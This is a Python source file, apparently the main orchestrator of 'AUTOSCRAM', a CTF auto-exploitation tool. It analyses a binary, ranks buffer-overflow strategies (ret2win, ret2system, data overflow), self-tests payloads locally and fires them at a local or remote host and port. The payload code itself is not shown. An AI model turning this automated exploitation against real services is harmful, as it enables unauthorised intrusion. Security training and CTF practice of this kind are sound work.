"""AUTOSCRAM orchestrator: triage -> detect vuln class -> verify -> exploit."""
import argparse
import sys

from pwn import context as pwn_context

from . import report
from .binary import Binary
from .analysis import analyze, describe
from .context import Context
from .comms import connect, run_payload, self_test, DEFAULT_FLAG_RE
from . import strategies


def _ask(msg, default=None):
    try:
        s = input(msg).strip()
    except EOFError:
        return default if default is not None else ""
    return default if (not s and default is not None) else s


def _parse_args(argv):
    ap = argparse.ArgumentParser(
        prog="autoscram",
        description="Modular CTF auto-pwn: analyze a binary, detect the bug, exploit it.")
    ap.add_argument("binary", help="path to the local target binary")
    ap.add_argument("--remote", metavar="HOST:PORT", help="attack a remote service")
    ap.add_argument("--local", action="store_true", help="force local run (no prompt)")
    ap.add_argument("--only", metavar="NAME",
                    help="force one strategy: data-overflow | ret2win | ret2system")
    ap.add_argument("--target", metavar="0xADDR", help="ret2win: explicit win address")
    ap.add_argument("--offset", type=int, help="override the auto RET offset")
    ap.add_argument("--pad", default="A", help="padding byte (default: A)")
    ap.add_argument("--align", action="store_true",
                    help="ret2win: add a `ret` gadget for stack alignment")
    ap.add_argument("--flag-format", default=DEFAULT_FLAG_RE,
                    help="regex used to recognize the flag in output")
    ap.add_argument("--no-verify", action="store_true",
                    help="skip the local self-test before firing")
    ap.add_argument("--yes", action="store_true",
                    help="don't prompt; take the top-ranked strategy")
    return ap.parse_args(argv)


def _rank(ctx):
    scored = []
    for strat in strategies.ALL:
        try:
            score, reason = strat.detect(ctx)
        except Exception as e:
            score, reason = 0, f"detect error: {e}"
        scored.append((score, strat, reason))
    scored.sort(key=lambda x: x[0], reverse=True)
    return scored


def _remote_from_args(args):
    if args.remote:
        host, port = args.remote.rsplit(":", 1)
        return (host, int(port))
    if args.local:
        return None
    if _ask("Hit [L]ocal or [R]emote? [L/R]: ", default="L").upper().startswith("R"):
        return (_ask("Host/domain: "), int(_ask("Port: ")))
    return None


def main(argv=None):
    pwn_context.log_level = "error"
    args = _parse_args(sys.argv[1:] if argv is None else argv)
    report.banner()

    binary = Binary(args.binary)
    binary.summary()

    res = analyze(binary)
    describe(res)

    ctx = Context(binary, res, args, args.flag_format)

    # --- rank strategies ---
    scored = _rank(ctx)
    report.step("Strategy ranking:")
    for score, strat, reason in scored:
        mark = " " if score <= 0 else "*"
        report.info(f"  [{mark}] {strat.name:<14} score={score:<3} {reason}")

    # --- choose ---
    if args.only:
        chosen = [s for _, s, _ in scored if s.name == args.only]
        if not chosen:
            report.err(f"Unknown strategy '{args.only}'.")
            return 2
        order = chosen
    else:
        order = [s for sc, s, _ in scored if sc > 0]
        if not order:
            report.err("No applicable strategy detected. "
                       "Inspect the binary manually (it may be a bug class "
                       "AUTOSCRAM doesn't handle yet).")
            return 1
        if not args.yes and sys.stdin.isatty():
            top = order[0]
            ans = _ask(f"Top strategy is '{top.name}'. [Enter]=go, or type a "
                       f"name to override: ", default="")
            if ans:
                order = [s for s in strategies.ALL if s.name == ans] or order

    remote_target = _remote_from_args(args)

    # --- try strategies in order, verifying locally when possible ---
    for strat in order:
        payload, interactive, note = strat.build(ctx)
        if payload is None:
            report.warn(f"{strat.name}: {note}; skipping.")
            continue
        report.ok(f"{strat.name}: {note}")

        if strat.verifiable and not args.no_verify:
            report.step(f"Self-testing {strat.name} on the local binary...")
            ok = self_test(binary.path, payload, ctx.flag_re,
                           extra_env={"USER": "ctf", "LOGNAME": "ctf"})
            if not ok:
                report.warn(f"{strat.name} did not produce the flag locally; "
                            "trying the next strategy.")
                continue
            report.ok(f"{strat.name} verified locally.")

        # fire on the real target
        report.step(f"Firing {strat.name} at "
                    f"{'remote' if remote_target else 'local'} target...")
        io = connect(binary.path, remote_target)
        flag = run_payload(io, payload, interactive=interactive,
                           flag_re=ctx.flag_re)
        if interactive or flag:
            return 0
        report.warn("No flag captured; trying the next strategy.")

    report.err("Exhausted strategies without capturing a flag.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
